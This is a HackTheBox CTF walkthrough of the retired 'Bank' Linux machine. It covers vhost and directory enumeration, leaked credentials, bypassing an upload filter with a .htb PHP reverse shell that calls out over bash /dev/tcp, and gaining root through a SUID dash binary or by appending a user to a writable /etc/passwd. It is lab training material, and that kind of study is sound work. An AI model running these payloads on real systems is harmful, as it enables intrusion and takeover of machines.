# HackTheBox — Bank

**Platform:** HackTheBox  
**Difficulty:** Medium  
**OS:** Linux  
**Category:** Web Exploitation / File Upload Bypass / SUID  
**Status:** Retired  

---

## Summary

Bank requires DNS configuration to resolve the vhost, enumeration of a PHP banking web app, discovering a hidden upload directory that bypasses extension filtering (`.htb` files execute as PHP), and privilege escalation via a SUID copy of `dash` or a writable `/etc/passwd`.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/bank 10.10.10.29
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.6
80/tcp open  http    Apache httpd 2.4.7
```

Add to `/etc/hosts`:

```
10.10.10.29  bank.htb
```

---

## Web Enumeration

Visiting `http://10.10.10.29` without the vhost redirects. With `bank.htb` in hosts file, we get a login form.

### Directory Brute-Force

```bash
gobuster dir -u http://bank.htb/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt
```

Key findings:

```
/uploads/         (Status: 403)
/balance-transfer/ (Status: 301)
```

### balance-transfer Directory

```bash
http://bank.htb/balance-transfer/
```

This directory contains thousands of `.acc` files — encrypted account data.

Most files are large (~500 bytes), but one is suspiciously small (~257 bytes):

```bash
# Sort by file size to find anomaly
# In the browser, sort by size
```

The small file contains **unencrypted credentials**:

```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
```

### Login

Using `chris@bank.htb` / `!##HTBB4nkP4ssw0rd!##` — successful login.

---

## Exploitation

### File Upload — Support Tickets

The support ticket system allows file uploads. The filter blocks `.php` files.

Inspecting the page source reveals a comment:

```html
<!-- [DEBUG] I added the file extension .htb to execute as PHP for debugging purposes only [DEBUG] -->
```

**Upload a `.htb` PHP reverse shell:**

```bash
# Create shell.htb
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'"); ?>
```

Upload via the support ticket form, then access it:

```
http://bank.htb/uploads/shell.htb
```

Shell lands as **www-data**.

---

## Privilege Escalation

### Method 1: SUID dash

```bash
find / -perm -u=s -type f 2>/dev/null | grep dash
# /var/htb/bin/emergency
```

```bash
/var/htb/bin/emergency
whoami
# root
```

### Method 2: Writable /etc/passwd

```bash
ls -la /etc/passwd
# -rw-rw-r-- 1 root www-data 1252 Jun 14 2017 /etc/passwd
```

`www-data` can write to `/etc/passwd`! Generate a password hash:

```bash
openssl passwd -1 hacker
# $1$random$hash
```

Append a new root user:

```bash
echo 'hacker:$1$random$hash:0:0:hacker:/root:/bin/bash' >> /etc/passwd
su hacker
# Password: hacker
whoami
# root
```

---

## Flags

```bash
cat /home/chris/user.txt
cat /root/root.txt
```

---

## Key Takeaways

- DNS vhosts hide web apps — always add target IPs to `/etc/hosts` with common names
- Look for anomalies when scanning directories with many similar files (size outliers)
- HTML source comments can leak critical information about upload filter bypasses
- Custom file extensions executing as PHP is a server misconfiguration — test uncommon extensions
- Writable `/etc/passwd` is an instant root — check it with `ls -la /etc/passwd`
- SUID binaries from unusual paths warrant manual inspection

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Web directory enumeration |
| Browser | Manual web exploitation |
| openssl | Password hash generation |
| netcat | Reverse shell listener |
